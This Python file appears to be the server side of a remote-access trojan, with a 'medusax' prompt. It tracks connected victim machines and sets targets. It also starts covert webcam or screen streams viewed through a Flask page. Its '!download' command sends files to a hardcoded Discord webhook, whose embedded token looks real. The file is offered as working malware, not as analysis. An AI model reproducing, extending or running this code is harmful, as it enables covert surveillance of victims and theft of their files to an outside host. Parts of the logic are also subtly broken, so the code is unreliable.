import socket
import threading
import time
from flask import Flask, render_template
import requests

# Global settings
SERVER_PORT = 9999
WEB_SERVER_PORT = 5000
connected_clients = {}  # {client_ip: client_socket}
target_ip = None
streaming = False
stream_type = None  # "screen" or "webcam"
start_time = None

# Initialize Flask app
app = Flask(__name__)

@app.route('/')
def index():
    if streaming:
        return render_template("stream.html", target_ip=target_ip, start_time=start_time, stream_status="Playing")
    else:
        return render_template("stream.html", target_ip=target_ip, start_time=start_time, stream_status="Stopped")

@app.route('/stop')
def stop_stream():
    global streaming
    streaming = False
    return "Streaming stopped!"

# Start the web server only after the stream starts
def start_web_server():
    app.run(host='0.0.0.0', port=WEB_SERVER_PORT)

# Client connection handler
def handle_client(client_socket, client_ip):
    global target_ip
    while True:
        command = client_socket.recv(1024).decode()
        if command == "!webcam_stream" or command == "!screen_stream":
            global streaming, stream_type, start_time
            target_ip = client_ip
            stream_type = command.split("_")[0]  # "screen" or "webcam"
            streaming = True
            start_time = time.strftime("%Y-%m-%d %H:%M:%S")
            print(f"Started streaming {stream_type} from {target_ip}")
            # Start the web server once streaming is activated
            web_server_thread = threading.Thread(target=start_web_server)
            web_server_thread.start()
        elif command.startswith("!download"):
            filename = command.split(" ")[1]
            with open(filename, "rb") as f:
                file_data = f.read()
                requests.post('https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2', files={'file': (filename, file_data)})
            print("[+] File sent to Discord")
        elif command == "!list":
            print("Client List:")
            for ip in connected_clients:
                print(f"Client IP: {ip}")
        elif command == "!set target":
            target_ip = client_ip
            print(f"Target set to {target_ip}")
        elif command == "!remove target":
            if target_ip == client_ip:
                target_ip = None
                print(f"Target {client_ip} removed.")

# Server connection setup
def start_server():
    global streaming, target_ip
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", SERVER_PORT))
    server_socket.listen(5)
    print("Server listening on port 9999...")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Client connected: {client_address}")
        connected_clients[client_address[0]] = client_socket
        client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address[0]))
        client_thread.start()

        # Show prompt if server is idle or no clients are connected
        if len(connected_clients) == 0 or not streaming:
            print("medusax > ", end="")

# Start the server
server_thread = threading.Thread(target=start_server)
server_thread.start()
